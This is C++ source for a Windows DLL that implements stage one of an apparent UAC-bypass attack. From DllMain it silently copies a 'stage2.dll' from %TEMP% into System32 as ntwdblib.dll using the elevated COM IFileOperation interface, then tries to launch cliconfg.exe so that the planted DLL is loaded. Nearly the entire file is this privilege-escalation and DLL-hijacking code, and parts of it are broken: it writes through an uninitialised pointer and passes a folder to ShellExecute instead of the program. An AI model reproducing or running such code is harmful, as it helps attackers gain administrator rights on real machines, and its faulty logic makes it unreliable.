// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#define _CTR_SECURE_NO_WARNINGS
#define DBG true

#include <windows.h> //win api
#include <thread>    //c++11 threading
#include <Shobjidl.h>//COM interface
#include <Shellapi.h>
#include <iostream>

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "shell32.lib")

void debug(const char *text)
{
	std::cout << text << std::endl;
}

HRESULT CopyItem(__in PCWSTR pszSrcItem, __in PCWSTR pszDest, PCWSTR pszNewName)
{
	//
	// Initialize COM as STA.
	//
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	if (SUCCEEDED(hr))
	{
		IFileOperation *pfo;

		//
		// Create the IFileOperation interface 
		//
		hr = CoCreateInstance(CLSID_FileOperation,
			NULL,
			CLSCTX_ALL,
			IID_PPV_ARGS(&pfo));
		if (SUCCEEDED(hr))
		{
			//
			// Set the operation flags. Turn off all UI from being shown to the
			// user during the operation. This includes error, confirmation,
			// and progress dialogs.
			//
			hr = pfo->SetOperationFlags(FOF_NO_UI);
			if (SUCCEEDED(hr))
			{
				//
				// Create an IShellItem from the supplied source path.
				//
				IShellItem *psiFrom = NULL;
				hr = SHCreateItemFromParsingName(pszSrcItem,
					NULL,
					IID_PPV_ARGS(&psiFrom));
				if (SUCCEEDED(hr))
				{
					IShellItem *psiTo = NULL;

					if (NULL != pszDest)
					{
						//
						// Create an IShellItem from the supplied 
						// destination path.
						//
						hr = SHCreateItemFromParsingName(pszDest,
							NULL,
							IID_PPV_ARGS(&psiTo));
					}

					if (SUCCEEDED(hr))
					{
						//
						// Add the operation
						//
						hr = pfo->CopyItem(psiFrom, psiTo, pszNewName, NULL);

						if (NULL != psiTo)
						{
							psiTo->Release();
						}
					}

					psiFrom->Release();
				}

				if (SUCCEEDED(hr))
				{
					//
					// Perform the operation to copy the file.
					//
					hr = pfo->PerformOperations();
				}
			}

			//
			// Release the IFileOperation interface.
			//
			pfo->Release();
		}

		CoUninitialize();
	}
	return hr;
}


//cliconfg	C:\Windows\System32\	ntwdblib.dll for Windows 7, 8 and 10	C:\Windows\System32\cliconfg.exe


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	AllocConsole();
	freopen("conin$", "r", stdin);
	freopen("conout$", "w", stdout);
	freopen("conout$", "w", stderr);
	debug("[ Stage 1 Started]");

	debug("[>] Preparing Enviroment");
		//Resolve %TEMP% path
	char* stage2path;
	stage2path = getenv("TEMP");
	strcat(stage2path, "\\stage2.dll");

	//THIS IS REALLY BAD ;( Needs a fix!
	wchar_t *z;
	for (int i=0; i <= sizeof(stage2path); i++)
	{
		z[i] = stage2path[0];
	}

	PCWSTR sourcePath = z;
	
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{

		debug("[>] Using IFileOperation to install stage2...");
		//Calls the COM interface to copy the stage 2 dll to the Windows path
		HRESULT test = CopyItem(sourcePath, L"C:\\Windows\\System32", L"ntwdblib.dll"); //Resolve the windows path it may not be in C:

		if (SUCCEEDED(test))
		{
			debug("[OK]");
		}
		else
		{
			debug("[FAIL]");
			Sleep(1000);
			return true; //end
		}

		debug("[>] Starting cliconfg...");
		HINSTANCE res = ShellExecute(NULL, L"open", L"C:\\Windows\\System32", NULL, NULL, 3);

		if ((int)res>32)
		{
			debug("[OK]");
		}
		else
		{
			debug("[FAIL]");
			Sleep(1000);
			return true;
		}
		
		debug("[>] Stage 1 completed");
		
	}


	return TRUE;//Shit, may I use  true or TRUE ?
}

